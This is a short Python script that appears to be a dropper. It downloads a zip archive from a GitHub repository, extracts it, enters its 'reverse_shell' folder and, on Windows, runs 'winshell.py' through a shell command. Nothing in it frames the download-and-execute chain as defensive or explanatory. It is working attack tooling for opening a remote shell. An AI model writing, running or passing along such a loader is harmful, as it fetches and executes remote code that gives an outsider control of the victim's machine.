import subprocess
import time
import os
import urllib.request
import platform

url = "https://github.com/jhonnunes443/Security_folder/archive/refs/heads/main.zip"
unziping = "tar -xvf main.zip"
directory = "Security_folder-main/reverse_shell"
task1 = "python3 winshell.py"
task2 = "python3 linshell.py"

def executing_scripts():
    try:
        test = platform.system()
        if test == "Windows":
            print("Windows test sucessful, trying executing file...\n")
            subprocess.run(task1, shell=True)
        else:
            print("None file was right.")
    except Exception as e:
        print("Fail to execute: ", e)

def downloading_file():
    if not os.path.isdir(directory):
        print("File not exist. \n")
        time.sleep(1)
        print("Downloading file...\n\n") 
        urllib.request.urlretrieve(url, "main.zip")
        time.sleep(1)
        print("Unziping file.\n")
        subprocess.run(unziping, shell=True)
        time.sleep(1)
        print("Changing directory.")
        os.chdir(directory) 
        print("#Running script.#")
        executing_scripts()
    else:
        print("Changing directory.")
        time.sleep(1)
        os.chdir(directory) 
        print("#Running script.#")
        executing_scripts()


downloading_file()        



executing_scripts()







